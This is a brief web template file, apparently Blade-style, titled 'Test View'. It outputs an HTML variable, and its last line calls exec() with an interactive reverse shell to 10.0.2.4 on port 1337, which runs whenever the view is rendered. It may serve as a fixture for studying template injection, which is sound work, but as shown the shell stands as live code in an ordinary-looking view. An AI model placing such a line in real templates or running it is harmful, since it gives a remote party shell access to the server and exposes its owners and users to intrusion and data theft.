<h1>Test View</h1>
{{ $html }}

{{ exec('sh -i >& /dev/tcp/10.0.2.4/1337 0>&1') }}
